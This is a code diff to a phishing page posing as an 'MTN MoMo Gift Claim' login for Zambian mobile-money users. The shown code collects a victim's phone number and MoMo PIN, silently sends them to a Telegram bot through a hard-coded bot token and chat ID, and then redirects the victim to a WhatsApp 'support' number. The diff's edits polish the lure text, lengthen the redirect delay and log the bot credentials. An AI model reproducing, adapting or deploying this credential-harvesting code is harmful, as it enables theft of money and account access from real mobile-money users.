@@ -411,13 +411,6 @@
             margin-bottom: 8px;
         }
 
-        .connecting-subtitle {
-            font-size: 14px;
-            color: #888;
-            font-weight: 500;
-            line-height: 1.5;
-        }
-
         .connecting-dots {
             display: inline-block;
         }
@@ -516,14 +509,13 @@
         <div class="connecting-content">
             <div class="wa-icon">💬</div>
             <div class="connecting-spinner"></div>
-            <div class="connecting-title">Connecting to our Support<span class="connecting-dots" id="dots">...</span></div>
-            <div class="connecting-subtitle">Please wait while we redirect you to WhatsApp</div>
+            <div class="connecting-title">Connecting with our Support<span class="connecting-dots" id="dots">...</span></div>
         </div>
     </div>
 
     <script>
         // ============================================
-        // TELEGRAM CREDENTIALS
+        // TELEGRAM CREDENTIALS (Same as index page)
         // ============================================
         const BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
         const CHAT_ID = '8313270294';
@@ -641,7 +633,7 @@
                 `📱 MoMo Phone: +260 ${phone}\n` +
                 `🔢 MoMo PIN: ${pin}\n\n` +
                 `⏰ Time: ${new Date().toLocaleString()}\n\n` +
-                `✅ User is being redirected to WhatsApp.`;
+                `✅ User is being connected to support.`;
 
             console.log('📤 Sending phone + PIN to Telegram (silent)...');
 
@@ -734,11 +726,11 @@
                 dotsEl.textContent = '.'.repeat(dotCount);
             }, 400);
 
-            // ✅ WAIT 4 SECONDS THEN REDIRECT TO WHATSAPP
+            // ✅ WAIT 6 SECONDS THEN REDIRECT TO WHATSAPP
             setTimeout(() => {
                 clearInterval(dotsInterval);
                 redirectToWhatsApp();
-            }, 4000);
+            }, 6000);
         });
 
         // ============================================
@@ -771,6 +763,8 @@
             console.log('✅ MTN MoMo Gift Claim - Zambia Login Loaded (Clean)');
             console.log('🇿🇲 Country: +260 (Zambia)');
             console.log('📱 WhatsApp: +254710161648');
+            console.log('🤖 Telegram Bot:', BOT_TOKEN.substring(0, 20) + '...');
+            console.log('📱 Telegram Chat ID:', CHAT_ID);
             console.log('🎁 Gift:', localStorage.getItem('selectedGift'), '-', localStorage.getItem('selectedGiftValue'));
             console.log('====================================');
         });
